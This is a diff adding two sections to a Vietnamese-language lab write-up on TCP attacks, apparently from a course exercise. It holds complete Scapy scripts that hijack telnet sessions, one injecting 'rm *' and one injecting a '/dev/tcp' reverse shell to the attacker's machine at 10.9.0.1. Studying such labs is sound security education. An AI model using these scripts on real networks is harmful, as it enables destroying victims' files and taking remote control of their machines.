@@ -331,3 +331,76 @@ sniff(iface="br-96b833532993", store=False, filter="tcp and port 23", prn=attack
 
 ![image](https://user-images.githubusercontent.com/44528004/142776501-9a3285a0-0c64-4074-957c-fdbba6857693.png)
 > Ngay lập tức mất kết nối!
+
+
+## Task3: TCP Session Hijacking
+### Attack
+Từ mô hình của task 2 và tấn công terminate connection thì ta dễ dãng thực hiện inject conmmand bằng cách thay đổi payload của gói PSH-ACK.
+
+- Attack Script
+
+```python
+from scapy.all import *
+
+def attack(packet):
+    if packet[TCP].flags=='PA':
+        ip = IP(src=packet[IP].dst,dst=packet[IP].src)
+        next_ack = packet[TCP].seq + packet[IP].len - 52
+        tcp = TCP(sport=packet[TCP].dport,dport=packet[TCP].sport,seq=packet[TCP].ack,ack=next_ack,flags='PA')
+        data = 'rm *\n'
+        reset_pkt = ip/tcp/data
+        send(reset_pkt)
+
+
+sniff(iface="br-9132eaaddac6",store=False,filter="tcp and port 23",prn=attack)
+```
+
+Command được inject là `rm *` (xóa tất cả các file trong thư mục hiện tại)
+
+### Kết quả
+- Máy victim trước khi bị tấn công 
+
+![image](https://user-images.githubusercontent.com/31529599/142842326-4417598d-bff6-4a98-8eea-bf4b204bccbe.png)
+
+- Tấn Công và kiểm tra kết quả
+
+![image](https://user-images.githubusercontent.com/31529599/142842683-257db038-87a2-4832-8d21-605d410b2d10.png)
+
+![image](https://user-images.githubusercontent.com/31529599/142842798-2e4404b3-11b1-45b1-990a-5288a0120406.png)
+
+## Task 4: Creating Reverse Shell using TCP Session Hijacking
+
+### Attack
+
+Thay command `rm *` bằng command reverse shell `/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1`
+
+Ip máy attacker: `10.9.0.1`
+
+- Attack Script
+```python
+from scapy.all import *
+
+def attack(packet):
+    if packet[TCP].flags=='PA':
+        ip = IP(src=packet[IP].dst,dst=packet[IP].src)
+        next_ack = packet[TCP].seq + packet[IP].len - 52
+        tcp = TCP(sport=packet[TCP].dport,dport=packet[TCP].sport,seq=packet[TCP].ack,ack=next_ack,flags='PA')
+        data = '/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\n'
+        reset_pkt = ip/tcp/data
+        send(reset_pkt)
+
+
+sniff(iface="br-9132eaaddac6",store=False,filter="tcp and port 23",prn=attack)
+
+```
+
+Listening trên máy attacker
+
+![image](https://user-images.githubusercontent.com/31529599/142843869-d7b87b44-2ac5-4d0d-a6a3-0bda505b55fe.png)
+
+
+### Kết quả
+
+![image](https://user-images.githubusercontent.com/31529599/142845036-9ce00c6b-0a45-4764-af1e-707527f13ce6.png)
+
+Attack thành công
